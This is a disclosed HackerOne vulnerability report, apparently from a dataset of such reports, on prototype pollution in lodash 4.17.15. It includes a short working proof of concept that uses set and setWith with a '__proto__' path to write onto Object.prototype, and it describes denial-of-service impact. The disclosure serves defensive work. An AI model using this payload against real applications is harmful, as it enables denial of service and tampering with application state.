---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '864701'
original_report_id: '864701'
title: Prototype Pollution lodash 4.17.15
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2020-05-02T11:10:22.062Z'
disclosed_at: '2020-08-21T10:34:29.931Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
asset_identifier: lodash
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype Pollution lodash 4.17.15

## Metadata

- HackerOne Report ID: 864701
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-21T10:34:29.931Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Prototype Pollution in lodash version 4.17.15
It allows Denial of Service and more. 

# Module
**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

27M in the last week

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:
1. Create a JS file with this contents:

lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(test)
console.log(test2)

2. Execute it with node
3. Observe that test and test2 are now on the Object.prototype.

## Supporting Material/References:

This is a variation on:
https://hackerone.com/reports/380873

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

test and test2 could just have easily been toString(). This would allow an attacker to cause a denial of service as all objects inherit from the Object.prototype. 
Additionally, if there are sensitive variables and attributes in a particular application, these can be controlled via the prototype.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
